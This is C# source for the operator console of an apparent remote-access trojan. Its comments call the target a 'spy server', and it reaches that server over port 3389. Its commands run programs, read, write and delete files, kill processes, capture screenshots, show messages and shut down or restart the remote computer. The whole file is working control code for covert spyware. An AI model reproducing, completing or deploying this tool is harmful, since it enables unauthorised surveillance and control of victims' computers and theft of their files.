using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace TcpClientApp
{
    class Program
    {
        /// <summary>
        /// Используемый порт
        /// </summary>
        private const int port = 3389;
        /// <summary>
        /// выполняемая команда
        /// </summary>
        static string command = "";
        /// <summary>
        /// IP-адрес сервера
        /// </summary>
        public static string IP = "no connection";
        /// <summary>
        /// IP-адрес сервера
        /// </summary>
        public static string tempIP = "no";

        // импорт метода библиотеки для завершения работы
        [DllImport("kernel32.dll")]
        public static extern void ExitProcess([In] uint uExitCode);

        /// <summary>
        /// Выводит список IP-адресов, связанных с переданным именем узла
        /// </summary>
        /// <param name="PCName"></param>
        static void GetPCAddress(string PCName)
        {
            // запросить у DNS-сервера IP-адрес, связанный с именем узла
            var host = Dns.GetHostEntry(PCName);
            // Пройдем по списку IP-адресов, связанных с узлом
            bool first = true;
            foreach (var ip in host.AddressList)
            {
                // если текущий IP-адрес версии IPv4, то выведем его 
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    if (first == true)
                    {
                        tempIP = ip.ToString();
                        first = false;
                    }

                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.Write("IP: ");
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine(ip.ToString());
                }
            }
            Console.WriteLine("The first IP of list setted like temporary");// Первый IP списка установлен как временный.");
        }


        /// <summary>
        /// Проверяет наличие соединения и возвращает true, если есть, и false, если no connection
        /// </summary>
        /// <returns></returns>
        static bool CheckConnection()
        {
            // доступно ли сетевое подключение
            if (!System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable())
            {
                return false;
            }
            else
                return true;
        }

        /// <summary>
        /// Обработчик команд
        /// </summary>
        /// <param name="command"></param>
        public static void RunCommand(string command)
        {
            switch (command)
            {
                case "":
                    break;
                case "help":
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\nCommands:");//Команды:");
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("cfile       - create file with some text on remote PC");// создать файл с некоторым текстом на удаленном ПК");
                    Console.WriteLine("cip         - show current IP");// показать текущий IP");
                    Console.WriteLine("clear       - clear the console");// очистить консоль");
                    Console.WriteLine("connect     - see \"setip\"");// смотреть \"setip\"");
                    Console.WriteLine("ctip        - show current temporary IP");// показать текущий временный IP");
                    Console.WriteLine("dfile       - delete file on remote PC. Entering \"sf\" will delete selected\n              earlier file");// удалить файл на удаленном ПК");
                    Console.WriteLine("exit        - exit the utility");// выйти из утилиты");
                    Console.WriteLine("getip       - get IP of PC with written by you name and save it like temporary");// возвращает IP-адрес ПК с определенным именем и сохраняет его как\n              временный IP");
                    Console.WriteLine("getproclist - get list of processes running on remote PC");// получить список процессов, запущенных на удаленном компьютере
                    Console.WriteLine("gsp         - get the path of location of the server");// получить путь расположения сервера на удаленном ПК");
                    Console.WriteLine("help        - show help, it's this text");// показать справку");
                    Console.WriteLine("killproc    - terminate process running on remote PC");// завершить процесс, запущенный на удаленном компьютере");
                    Console.WriteLine("message     - show the window containing your message on remote PC");// показать окно с вашим сообщением на удаленом ПК");
                    Console.WriteLine("mip         - show IP of this PC and save it like temporary");// показать IP данного ПК и сохранить как временный IP");
                    Console.WriteLine("quit        - shutdown the server on remote PC");// выключение сервера на удаленном ПК");
                    Console.WriteLine("restart     - restart remote PC");// перезапустить удаленный ПК");
                    Console.WriteLine("rfile       - read file on remote PC");// прочитать файл на удаленном ПК");
                    Console.WriteLine("run         - run the program on remote PC");// запуск программы на удаленном ПК");
                    Console.WriteLine("say         - show a pop-up notification with your message on remote PC");// показать всплывающую подсказку с вашим сообщением на удаленном ПК");
                    Console.WriteLine("selfile     - choosing file on remote PC for reading & writing");// выбор файла на удаленном ПК для записи");
                    Console.WriteLine("setip       - set IP remote PC for connecting. If enter \"t\", temporary IP will\n              be set.");// устанавливает IP удаленного ПК для подключения. Если ввести \"t\",\n              будет установлен временный IP");
                    Console.WriteLine("shutdown    - shutdown remote PC");// выключить удаленный ПК");
                    Console.WriteLine("wfile       - write to file on remote PC");// запись в файл на удаленном ПК");
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("\nCreated by Ivanshka.\nFeedback: vk.com/ivanshkaa\n"); //Обратная связь: vk.com/ivanshkaa\n");
                    Console.ForegroundColor = ConsoleColor.Gray;
                    break;

                case "cip":
                    if (IP == "no connection")
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("You aren't connected! Connect to a remote PC to execute commands!");// Вы не подключены! Подключитесь к удаленому ПК для выполнения команд.");
                        Console.ForegroundColor = ConsoleColor.Gray;
                        return;
                    }
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.Write("Current IP: ");// Текущий IP: ");
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine(IP);
                    Console.ForegroundColor = ConsoleColor.Gray;
                    break;
                case "ctip":
                    if (IP == "no")
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("No temporary IP");// Отсутствует временный IP!");
                        Console.ForegroundColor = ConsoleColor.Gray;
                        return;
                    }
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.Write("Current temporary IP: ");// Текущий временный IP: ");
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine(tempIP);
                    Console.ForegroundColor = ConsoleColor.Gray;
                    break;
                case "getip":
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("Enter PC name: ");// Введите имя ПК:");
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    try
                    {
                        string name = Console.ReadLine();
                        GetPCAddress(name);
                    }
                    catch
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("PC not found!");// ПК не найден!");
                    }
                    Console.ForegroundColor = ConsoleColor.Gray;
                    break;
                case "connect":
                case "setip":
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    // временный IP
                    string t = IP;
                    Console.Write("New IP: ");// Новый IP: ");
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    IP = Console.ReadLine();
                    if (IP == "t")
                    {
                        IP = tempIP;
                    }
                    // проверяем соединение с сервером-шпионом
                    if (!SendCommand("_TEST_CONNECTING"))
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\nServer not found! IP isn't changed!");
                        Console.ForegroundColor = ConsoleColor.Gray;
                        IP = t;
                        break;
                    }
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("IP set!");
                    Console.ForegroundColor = ConsoleColor.Gray;
                    break;
                case "mip":
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.Write("Your IP: ");
                    Console.ForegroundColor = ConsoleColor.Green;
                    tempIP = Dns.GetHostByName(Dns.GetHostName()).AddressList[0].ToString();
                    Console.WriteLine(tempIP);
                    Console.ForegroundColor = ConsoleColor.Gray;
                    break;
                case "run":
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.Write("Enter the command to execute: ");// Введите команду для выполнения:\n> ");
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    command = Console.ReadLine();
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.Write("Answer: ");// Ответ: ");
                    SendCommand("run|" + command);
                    Console.ForegroundColor = ConsoleColor.Gray;
                    break;
                case "getproclist":
                case "shutdown":
                case "restart":
                case "screen":
                case "rfile":
                case "gsp":
                    SendCommand(command);
                    break;
                case "say":
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.Write("Enter the message:\n ");// Введите сообщение:\n> ");
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    command = Console.ReadLine();
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.Write("Answer: ");// Ответ: ");
                    SendCommand("say|" + command);
                    Console.ForegroundColor = ConsoleColor.Gray;
                    break;
                case "message":
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.Write("Enter the message:\n ");// Введите сообщение:\n> ");
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    command = Console.ReadLine();
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.Write("Ansert: "); // Ответ: ");
                    SendCommand("message|" + command);
                    Console.ForegroundColor = ConsoleColor.Gray;
                    break;
                //Console.ForegroundColor = ConsoleColor.Cyan;
                //Console.WriteLine("Command is developing!");// Команда в разработке!");
                //Console.ForegroundColor = ConsoleColor.Gray;
                //break;
                case "cfile":
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.Write("Enter path with file name: ");
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    string path = Console.ReadLine();
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.Write("Enter text: ");
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    string text = Console.ReadLine();
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    SendCommand(command + "|" + path + "|" + text);
                    Console.ForegroundColor = ConsoleColor.Gray;
                    break;
                case "wfile": // пишет в установленный файл
                    Console.Write("Enter text: ");
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    text = Console.ReadLine();
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    SendCommand(command + "|" + text);
                    Console.ForegroundColor = ConsoleColor.Gray;
                    break;
                case "dfile": // удаляет файл 
                case "selfile": // устаналивает файл для записи
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.Write("Enter path with file name: ");
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    path = Console.ReadLine();
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    SendCommand(command + "|" + path);
                    Console.ForegroundColor = ConsoleColor.Gray;
                    break;
                case "killproc":
                    Console.WriteLine("Enter process name to terminate:");// Введите имя процесса для завершения");
                    text = Console.ReadLine();
                    SendCommand(command + "|" + text);
                    break;
                case "quit":
                    SendCommand(command);
                    Console.ForegroundColor = ConsoleColor.Gray;
                    break;
                case "clear":
                    Console.Clear();
                    break;
                case "exit":
                    Console.Write("Exit...");// Выход...");
                    ExitProcess(0);
                    break;

                default:
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Unknown command!");// Неизвестная команда!");
                    Console.ForegroundColor = ConsoleColor.Gray;
                    break;
            }
        }

        /// <summary>
        /// Конвертация массива байт в изображение
        /// </summary>
        /// <param name="bytesArr">массив для конвертации</param>
        /// <returns></returns>
        public static Image ByteArrayToImage(byte[] bytesArr)
        {
            MemoryStream memstr = new MemoryStream(bytesArr);
            Image img = Image.FromStream(memstr);
            return img;
        }

        /// <summary>
        /// Метод для отсылки команд
        /// </summary>
        /// <param name="command"></param>
        static bool SendCommand(string command)
        {
            if (IP == "no connection")
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("You aren't connected! Connect to a remote PC to execute commands!");// Вы не подключены! Подключитесь к удаленому ПК для выполнения команд.");
                Console.ForegroundColor = ConsoleColor.Gray;
                return false;
            }
            try
            {
                TcpClient Client = new TcpClient();
                Client.Connect(IP, port);

                // отправляем команду
                // сетевой поток данных
                NetworkStream stream = Client.GetStream();
                byte[] data = Encoding.UTF8.GetBytes(command);
                stream.Write(data, 0, data.Length);

                //получаем ответ
                data = new byte[524288];

                // чекаем команду
                switch (command)
                {
                    case "screen":
                        Image img;
                        stream.Read(data, 0, data.Length);
                        // Получаем изображение из массива байтов
                        img = ByteArrayToImage(data);
                        Form f = new Form();
                        f.Size = new Size(1280, 720);
                        f.StartPosition = FormStartPosition.CenterScreen;
                        f.MaximizeBox = true;
                        PictureBox p = new PictureBox();
                        p.Dock = DockStyle.Fill;
                        p.Image = img;
                        f.Controls.Add(p);
                        Application.Run(f);
                        //img.Save("screenshot.png", ImageFormat.Png);
                        //Process.Start("screenshot.png");
                        break;
                    case "_TEST_CONNECTING":
                        break;
                    default:
                        // получаем количество считанных байтов
                        int bytes = stream.Read(data, 0, data.Length);
                        string message = Encoding.UTF8.GetString(data, 0, bytes);
                        Console.WriteLine(message);
                        break;
                }

                // Закрываем поток
                stream.Close();
                // Закрываем клиент
                Client.Close();

                return true;
            }
            catch (SocketException e)
            {
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.WriteLine("SocketException: {0}", e);
                Console.ForegroundColor = ConsoleColor.Gray;
                return false;
            }
            catch (Exception e)
            {
                Console.WriteLine("Exception: {0}", e.Message);
                return false;
            }
        }

        /// <summary>
        /// Точка входа в программу
        /// </summary>
        //[STAThread]
        static void Main()
        {
            Console.Title = "Remote Controller";

            if (!CheckConnection())
            {
                Console.WriteLine("No network connection! Exit...");// Нет соединения с сетью! Выход. . .");
                Thread.Sleep(1000);
                return;
            }
            
            while (true)
            {
                Console.ForegroundColor = ConsoleColor.Magenta;
                Console.Write("\nRC> ");
                command = Console.ReadLine();
                Console.ForegroundColor = ConsoleColor.Yellow;
                RunCommand(command);
            }
        }
    }
}